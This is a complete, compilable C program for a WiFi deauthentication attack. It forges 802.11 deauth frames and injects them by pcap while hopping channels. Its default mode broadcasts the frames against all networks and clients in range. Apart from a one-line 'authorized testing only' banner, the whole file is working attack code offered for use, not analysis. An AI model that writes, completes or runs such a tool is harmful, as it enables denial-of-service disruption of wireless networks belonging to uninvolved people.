/*
 * WiFi Deauthentication Tool - Fixed for headless/broadcast mode
 * Compile: gcc -o deauther deauth.c -lpcap -lpthread
 */

#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>

#define RADIOTAP_LEN 8
#define DEAUTH_BURST 64

// Channel list for hopping (2.4 GHz only)
int channels[] = {1, 6, 11};
int num_channels = 3;
int channel_hop = 1;
int running = 1;
pthread_t hop_thread;
pcap_t *handle = NULL;

// Signal handler for clean exit
void signal_handler(int sig) {
    printf("\n[*] Stopping deauther...\n");
    running = 0;
    if (handle) pcap_close(handle);
    exit(0);
}

// Convert MAC string to bytes
int str_to_mac(const char *str, unsigned char *mac) {
    int values[6];
    if (sscanf(str, "%x:%x:%x:%x:%x:%x",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) == 6) {
        for (int i = 0; i < 6; i++) {
            mac[i] = (unsigned char)values[i];
        }
        return 0;
    }
    return -1;
}

// Build radiotap header
void build_radiotap(unsigned char *rtap) {
    rtap[0] = 0x00;
    rtap[1] = 0x00;
    rtap[2] = RADIOTAP_LEN;
    rtap[3] = 0x00;
    rtap[4] = 0x00;
    rtap[5] = 0x00;
    rtap[6] = 0x00;
    rtap[7] = 0x00;
}

// Build and send deauth frame
void send_deauth(const unsigned char *client_mac, const unsigned char *ap_mac, int burst, int delay_us) {
    unsigned char packet[128];
    unsigned char rtap[] = {0x00, 0x00, 0x0c, 0x00, 0x04, 0x80, 0x00, 0x00, 
                      0x02, 0x00, 0x18, 0x00};
    
    memcpy(packet, rtap, sizeof(rtap));
    unsigned char *deauth = packet + sizeof(rtap);
    
    // Frame control: Deauth
    deauth[0] = 0xC0;
    deauth[1] = 0x00;
    deauth[2] = 0x3A;
    deauth[3] = 0x01;
    
    // Addresses
    memcpy(deauth + 4, client_mac, 6);   // Dest
    memcpy(deauth + 10, ap_mac, 6);      // Source
    memcpy(deauth + 16, ap_mac, 6);      // BSSID
    deauth[22] = 0x00;
    deauth[23] = 0x00;
    deauth[24] = 0x07;  // Reason code
    deauth[25] = 0x00;
    
    int pkt_len = sizeof(rtap) + 26;
    
    // Send burst
    for (int i = 0; i < burst && running; i++) {
        pcap_inject(handle, packet, pkt_len);
        usleep(delay_us);
    }
    
    // Also send client->AP direction
    memcpy(deauth + 4, ap_mac, 6);
    memcpy(deauth + 10, client_mac, 6);
    memcpy(deauth + 16, ap_mac, 6);
    
    for (int i = 0; i < burst && running; i++) {
        pcap_inject(handle, packet, pkt_len);
        usleep(delay_us);
    }
}

// Channel hopper thread
void *channel_hopper(void *arg) {
    char cmd[64];
    int idx = 0;
    
    while (running && channel_hop) {
        snprintf(cmd, sizeof(cmd), "iw dev wlan1 set channel %d", channels[idx]);
        system(cmd);
        printf("[*] Channel: %d\n", channels[idx]);
        
        idx = (idx + 1) % num_channels;
        sleep(2);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    char errbuf[PCAP_ERRBUF_SIZE];
    int opt;
    
    // DEFAULTS - no args required
    unsigned char target_ap[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};  // Broadcast
    unsigned char target_client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    int burst_count = 64;
    int delay = 1000;
    
    printf("========================================\n");
    printf("  WiFi Deauthentication Tool\n");
    printf("  FOR AUTHORIZED TESTING ONLY\n");
    printf("========================================\n\n");
    
    // Parse optional args
    while ((opt = getopt(argc, argv, "a:c:b:d:h")) != -1) {
        switch (opt) {
            case 'a': 
                if (str_to_mac(optarg, target_ap) < 0) {
                    fprintf(stderr, "[!] Invalid AP MAC\n");
                    return 1;
                }
                break;
            case 'c':
                if (str_to_mac(optarg, target_client) < 0) {
                    fprintf(stderr, "[!] Invalid client MAC\n");
                    return 1;
                }
                break;
            case 'b': burst_count = atoi(optarg); break;
            case 'd': delay = atoi(optarg); break;
            case 'h':
            default:
                printf("Usage: %s [options]\n", argv[0]);
                printf("  -a: Target AP MAC (default: broadcast all)\n");
                printf("  -c: Target client MAC (default: broadcast)\n");
                printf("  -b: Packets per burst (default: 64)\n");
                printf("  -d: Delay in microseconds (default: 1000)\n");
                return 0;
        }
    }
    
    signal(SIGINT, signal_handler);
    
    printf("[*] Opening wlan1...\n");
    handle = pcap_open_live("wlan1", 65535, 1, 1, errbuf);
    if (!handle) {
        fprintf(stderr, "[!] Failed: %s\n", errbuf);
        return 1;
    }
    
    printf("[*] Injection ready\n");
    
    if (memcmp(target_ap, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) == 0) {
        printf("[*] Mode: BROADCAST (all networks)\n");
    } else {
        printf("[*] Target: %02X:%02X:%02X:%02X:%02X:%02X\n",
               target_ap[0], target_ap[1], target_ap[2],
               target_ap[3], target_ap[4], target_ap[5]);
    }
    
    pthread_create(&hop_thread, NULL, channel_hopper, NULL);
    
    printf("[*] Attacking... Press Ctrl+C to stop\n\n");
    
    while (running) {
        send_deauth(target_client, target_ap, burst_count, delay);
        sleep(1);
    }
    
    pthread_join(hop_thread, NULL);
    pcap_close(handle);
    
    return 0;
}